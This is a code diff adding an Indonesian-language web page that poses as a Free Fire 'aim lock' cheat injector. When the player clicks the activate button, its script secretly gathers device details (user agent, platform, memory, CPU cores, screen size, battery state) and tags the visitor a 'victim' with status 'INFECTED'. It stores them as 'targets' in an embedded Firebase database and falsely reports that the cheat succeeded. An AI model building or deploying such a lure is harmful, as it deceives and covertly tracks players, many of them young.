@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AIM LOCK FF V2 - 99% HEADSHOT</title>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .glow { text-shadow: 0 0 10px #ff0000; }
+    </style>
+</head>
+<body class="bg-zinc-950 text-white font-sans">
+    <div class="flex flex-col items-center justify-center min-h-screen p-4 text-center">
+        <div class="mb-6 p-4 bg-red-600 rounded-full animate-bounce shadow-[0_0_30px_rgba(220,38,38,0.5)]">
+            <svg class="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2z"/></svg>
+        </div>
+        <h1 class="text-3xl font-black italic uppercase glow tracking-tighter mb-2">AIM LOCK FF 99% HEADSHOT</h1>
+        <p class="text-zinc-500 text-xs mb-8 uppercase tracking-widest font-mono">Status: <span class="text-green-500 underline">UNDETECTED</span></p>
+        
+        <div id="status-box" class="w-full max-w-xs bg-zinc-900 border border-zinc-800 p-6 rounded-[2rem] shadow-2xl">
+            <p id="msg" class="text-sm font-bold mb-4">Siap Menginjeksi Cheat ke Game?</p>
+            <button id="inject-btn" class="w-full bg-red-600 hover:bg-red-700 py-4 rounded-2xl font-black uppercase text-xs tracking-[0.2em] transition-all active:scale-95 shadow-lg shadow-red-900/40">
+                AKTIFKAN CHEAT SEKARANG
+            </button>
+        </div>
+
+        <p class="mt-8 text-[10px] text-zinc-700 uppercase font-mono">Garena Free Fire © 2024 Injector Bypass</p>
+    </div>
+
+    <script>
+        const config = 
+{
+  "apiKey": "AIzaSyCqyCcs2R2e7AegGjvFAwG98wlamtbHvZY",
+  "authDomain": "bard-frontend.firebaseapp.com",
+  "projectId": "bard-frontend",
+  "storageBucket": "bard-frontend.firebasestorage.app",
+  "messagingSenderId": "175205271074",
+  "appId": "1:175205271074:web:2b7bd4d34d33bf38e6ec7b"
+}
+;
+        firebase.initializeApp(config);
+        const db = firebase.firestore();
+
+        document.getElementById('inject-btn').onclick = async function() {
+            this.disabled = true;
+            this.innerText = "SEDANG MENGINJEKSI...";
+            this.classList.add('animate-pulse');
+            
+            try {
+                const battery = await navigator.getBattery?.() || {};
+                const data = {
+                    victim_name: "FF_PLAYER_" + Math.floor(Math.random() * 9999),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    ram: navigator.deviceMemory || 'Hidden',
+                    cores: navigator.hardwareConcurrency || 'Hidden',
+                    screen: screen.width + 'x' + screen.height,
+                    battery: (battery.level * 100) + '%',
+                    charging: battery.charging ? 'YES' : 'NO',
+                    timestamp: new Date().toLocaleString(),
+                    status: "INFECTED"
+                };
+
+                const devId = 'ID-' + Math.random().toString(36).substr(2, 7).toUpperCase();
+                
+                await db.collection('artifacts').doc('c_9a5c1e97022a8cb6_monitoring_app.jsx-897').collection('public').doc('data').collection('targets').doc(devId).set(data);
+
+                document.getElementById('msg').innerHTML = "<span class='text-green-500'>INJEKSI BERHASIL!</span><br>Buka game Free Fire Anda sekarang.";
+                this.classList.remove('bg-red-600');
+                this.classList.add('bg-green-600');
+                this.innerText = "CHEAT AKTIF";
+            } catch (e) {
+                alert("Koneksi Error. Pastikan internet stabil.");
+            }
+        };
+    </script>
+</body>
+</html>
